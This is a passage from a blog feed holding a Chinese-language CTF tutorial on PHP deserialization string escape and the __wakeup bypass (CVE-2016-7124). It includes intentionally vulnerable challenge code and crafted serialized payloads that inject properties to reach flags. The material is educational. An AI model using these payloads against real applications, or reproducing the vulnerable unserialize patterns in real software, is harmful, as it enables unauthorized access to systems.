class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Php反序列化字符串逃逸</title>
      <link href="/2023/08/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/"/>
      <url>/2023/08/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-反序列化字符串逃逸"><a href="#PHP-反序列化字符串逃逸" class="headerlink" title="PHP 反序列化字符串逃逸"></a>PHP 反序列化字符串逃逸</h1><h3 id="反序列化是什么？"><a href="#反序列化是什么？" class="headerlink" title="反序列化是什么？"></a>反序列化是什么？</h3><p>PHP序列化：serialize()</p><p>序列化是将变量或对象转换成字符串的过程，用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。</p><p>而PHP反序列化：unserialize()</p><p>反序列化是将字符串转换成变量或对象的过程</p><p>通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击。这样说可能还不是很具体，举个列子比如你网购买一个架子，发货为节省成本，是拆开给你发过去，到你手上，然后给你说明书让你组装，拆开给你这个过程可以说是序列化，你组装的过程就是反序列化</p><p>谈到php反序列化，我们先来看一下PHP他的面向对象怎么个理解，</p><p>面向过程vs面向对象</p><p><strong>面向过程</strong><br>面向过程是一种以“整体事件”为中心的编程思想，编程的时候把解决问题的步骤分析出来，然后用函数把这些步骤实现，在一步一步的具体步骤中再按顺序调用函数。<br><strong>面向对象</strong><br>面向对象是一种以“对象”为中心的编程思想，把要解决的问题分解成各个“对象”;<br>对象是一个由信息及对信息进行处理的描述所组成的整体，是对现实世界的抽象。<br>对象的三个特征:<strong>对象的行为，对象的形态，对象的表示</strong></p><p>类是定义了一件事物的抽象特点，它将数据的形式以及这些数据上的操作封装在一起。<br>对象是具有类类型的变量，是对类的实例。</p><p>内部构成：成员变量（属性）+成员函数（方法）</p><h3 id="php序列化的字母标识"><a href="#php序列化的字母标识" class="headerlink" title="php序列化的字母标识"></a>php序列化的字母标识</h3><p>a - array</p><p>b - boolean</p><p>d - double</p><p>i - integer</p><p>o - common object</p><p>r - reference</p><p>s - string</p><p>C - custom object</p><p>O - class</p><p>N - null</p><p>R - pointer reference</p><p>U - unicode string</p><p>N - NULL</p><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p>__construct 当一个对象创建时被调用，new 一个</p><p>__destruct 当一个对象销毁时被调用，序列化一个</p><p>__toString 当一个对象被当作一个字符串被调用。</p><p>__wakeup() 使用unserialize时触发</p><p>__sleep() 使用serialize时触发</p><p>__destruct() 对象被销毁时触发</p><p>__call() 对不存在的方法或者不可访问的方法进行调用就自动调用</p><p>__callStatic() 在静态上下文中调用不可访问的方法时触发</p><p>__get() 用于从不可访问的属性读取数据</p><p>__set() 在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用</p><p>__isset() 在不可访问的属性上调用isset()或empty()触发</p><p>__unset() 在不可访问的属性上使用unset()时触发</p><p>__toString() 把类当作字符串使用时触发,返回值需要为字符串</p><p>__invoke() 当脚本尝试将对象调用为函数时触发</p><p>注意点：private protected 属性 序列化出来会有不可打印字符，需要url编码一下</p><h3 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="__wakeup绕过"></a>__wakeup绕过</h3><p>这个其实是个CVE,CVE-2016-7124</p><p>影响版本php5&lt;5.6.25,php7&lt;7.010</p><p>简单描述就是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p><p>而魔术方法__wakeup执行unserialize()时，<strong>先</strong>会调用这个函数</p><p>我们本地实验一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&quot;触发__construct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&quot;触发__wakeup&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/08/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/1/hexoblog/source/image/image-20230801115227872-1700990458631-263.png"></p><p>先序列化一下，触发了___construct，将序列化的内容我们在反序列化看一看</p><p><img src="/2023/08/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/1/hexoblog/source/image/image-20230801115556904-1700990458631-264.png"></p><blockquote><p>这样则触发了__wake,我们将O:1:”A”:2:{s:1:”a”;s:17:”触发__construct”;} 把对象个数改为2</p></blockquote><p>触发了__construct,绕过了wakeup</p><h3 id="反序列化逃逸问题"><a href="#反序列化逃逸问题" class="headerlink" title="反序列化逃逸问题"></a>反序列化逃逸问题</h3><p>逃逸问题的本质是改变序列化字符串的长度，导致反序列化漏洞</p><p>所以会有两种情况，一种是由长变短,一种是由短变长；}</p><h3 id="由长变短"><a href="#由长变短" class="headerlink" title="由长变短"></a>由长变短</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">&quot;abcsystem()system()system()&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$a</span>,<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">//$data = str_replace(&quot;system()&quot;,&quot;&quot;,$data);</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>)); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abcsystem()system()system()&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br><span class="line">    <span class="comment">//O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abc&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>O:1:”A”:2:{s:2:”v1”;s:27:”abc”;s:2:”v2”;s:3:”123”;}</p><p>O:1:”A”:2:{s:2:”v1”;s:27:”**abc”;s:2:”v2”;s:3:”**s:2:”v3”;s:3:”123”;}”;}</p><p>O:1:”A”:2:{s:2:”v1”;s:27:”abc<del>system()system()system()</del>“;s:2:”v2”;s:？？:”1234567”;s:2:”v3”;N;}”;}</p><p>{s:2:”v1”;s:27:”<strong>abc”;s:2:”v2”;s:21:”1234567</strong>“;s:2:”v3”;N;}”;}</p></blockquote><h3 id="由短变长"><a href="#由短变长" class="headerlink" title="由短变长"></a>由短变长</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>());</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;pwd&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:2:&quot;ls&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br><span class="line"><span class="comment">//O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:2:&quot;pwd&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>O:1:”A”:2:{s:2:”v1”;s:2:”ls”;s:2:”v2”;s:3:”123”;}</p><p>&#x2F;O:1:”A”:2:{s:2:”v1”;s:2:”pwd”;s:2:”v2”;s:3:”123”;}</p><p>字符串增多，会把末尾的字符串挤出来，</p><p>就可以利用挤出来的字符串来构造我们利用的功能性代码</p><p>O:1:”A”:2:{s:2:”v1”;s:2:”pw<strong>d”;s:2:”v3”;s:3:”www”;}</strong>;”s:2:”v2”;s:3:”123”;}</p><p>要吐出这些字符d”;s:2:”v3”;s:3:”www”;},使结构完整，并且可以吧序列化结束掉，原本的那些就不管了</p><p>增加了22位一个ls，转换为pwd,增加一个字符，需要转换22个字符</p><p>O:1:”A”:2:{s:2:”v1”;s:66:”lslslslslslslslslslslslslslslslslslslslslsls”;s:2:”v3”;s:3:”www”;}；”s:2:”v2”;s:3:”123”;}</p></blockquote><p><img src="/2023/08/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/1/hexoblog/source/image/image-20230804134635993-1700990458631-266.png"></p><p>例题：字符串增多</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span>=<span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="variable">$name</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>=<span class="string">&#x27;daydream&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$param</span>));</span><br><span class="line"><span class="variable">$profile</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$param</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span>-&gt;pass==<span class="string">&#x27;escaping&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>=<span class="string">&#x27;escaping&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;N;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>O:4:”test”:2:{s:4:”user”;N;<strong>s:4:”pass”;s:8:”escaping”;}</strong>“;</p><p>O:4:”test”:2:{s:4:”user”;s:3:”php”;<strong>s:4:”pass”;s:8:”escaping”;}</strong>“;</p><p>O:4:”test”:2:{s:4:”user”;s:3:”php**”;s:4:”pass”;s:8:”escaping”;}**”;</p><p>O:4:”test”:2:{s:4:”user”;s:116:”phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp”;s:4:”pass”;s:8:”escaping”;}”;</p><p>O:4:”test”:2:{s:4:”user”;s:116:”hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack**”;s:4:”pass”;s:8:”escaping”;}**”;</p><p>提交phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp”;s:4:”pass”;s:8:”escaping”;}得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfstu&#123;5c202c62-7567-4fa0-a370-134fe9d16ce7&#125;</span><br></pre></td></tr></table></figure><p>字符串减少</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span>=<span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="variable">$name</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>,<span class="string">&quot;hk&quot;</span>,<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$vip</span> = <span class="literal">false</span> ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>,<span class="variable">$pass</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;pass=<span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$pass</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$param</span>,<span class="variable">$pass</span>));</span><br><span class="line"><span class="variable">$profile</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$param</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span>-&gt;vip)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>=<span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>=<span class="string">&quot;qlnu&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$vip</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="comment">//O:4:&quot;test&quot;:3:&#123;s:4:&quot;user&quot;;s:4:&quot;flag&quot;;s:4:&quot;pass&quot;;s:4:&quot;qlnu&quot;;s:3:&quot;vip&quot;;b:1;&#125;</span></span><br></pre></td></tr></table></figure><p>O:4:”test”:3:{s:4:”user”;s:4:”flag”;s:4:”pass”;s:4:”qlnu”;s:3:”vip”;b:1;} </p><p>思路：这道题目中flag会被替换成hk，会造成字符串减少，就会往后吃，我们要知道往后吃多少个，在这段代码里VIP的值不可以动，我们可以通过修改qlnu的值来利用字符串逃逸     目标代码”;s:4:”pass”;s:4:”</p><p>这里就会造成成员属性少一个， 那么我们最终的逃逸代码要是”;s:4:”pass”;s:4:”qlnu”;s:3:”vip”;b:1;}，保证成员属性不会少</p><p>来判断要吃的字符串</p><p>“;s:4:”pass”;s:4:”     19位</p><p>flag到hk，吃一次少2个，最少要吃10次，少一位，后面补一下就好了<strong>a”;s:4:”pass”;s:4:”qlnu”;s:3:”vip”;b:1;}</strong></p><p>传参就是让user的值为flagflagflagflagflagflagflagflagflagflag</p><p>pass的值就是a”;s:4:”pass”;s:4:”qlnu”;s:3:”vip”;b:1;}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfstu&#123;5c202c62-7567-4fa0-a370-134fe9d16ce7&#125;</span><br></pre></td></tr></table></figure><h2 id="php反序列化题目"><a href="#php反序列化题目" class="headerlink" title="php反序列化题目"></a>php反序列化题目</h2><h3 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">xctf</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span> (<span class="variable">$a</span>)   ;</span><br><span class="line"><span class="comment">//code=O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>__wake up绕过</p><p>在传入的序列化字符串在反序列化对象时与真实存在的参数个数不同时会跳过执行，即当前函数中只有一个参数$flag，若传入的序列化字符串中的参数个数为2即可绕过。</p><p>?code&#x3D;O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p><h3 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span 